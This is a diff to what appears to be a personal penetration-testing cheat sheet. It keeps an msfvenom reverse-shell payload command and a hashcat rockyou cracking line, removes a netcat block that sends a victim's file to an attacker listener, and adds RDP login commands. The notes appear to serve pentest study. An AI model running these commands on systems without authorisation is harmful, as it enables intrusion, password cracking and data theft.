@@ -33,22 +33,10 @@ ___
 	msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f exe -o reverse-shell.exe
 	```
 
-- Password "cracking": `hashcat -m $ATTACK_MODE $FILE /usr/share/wordlists/rockyou.txt`
+- Password cracking: `hashcat -m $ATTACK_MODE $FILE /usr/share/wordlists/rockyou.txt`
 	+ `-r /usr/share/hashcat/rules/best64.rule` (Rule-based Attack)
 
-- Transfering file using **netcat**:	
-	+ Attacker's machine:
-
-		```bash
-		$ nc -l -p $LPORT  > $RFILE < /dev/null
-		^C
-		```
-
-	+ Victim's machine:
-	
-		```bash
-		$ cat $LFILE | nc $RHOST $RPORT
-		```
+- [File transfer techniques](https://github.com/amirr0r/notes/blob/master/Infosec/Pentest/file-transfer.md)
 
 ## Common services/ports
 
@@ -172,6 +160,14 @@ ___
 ## Windows
 
 - [VbScrub - Tutorials](https://www.youtube.com/playlist?list=PL3B8L-z5QU-Yw80HOGXXUASBfv_K1WwO5)
+
+### RDP
+
+```bash
+xfreerdp /u:<USER> /p:<PASS> /v:<IP> /cert:ignore
+
+rdesktop -u <USER> -p <PASS> <IP>:3389
+```
 
 ### Port 135 (RPC)
 
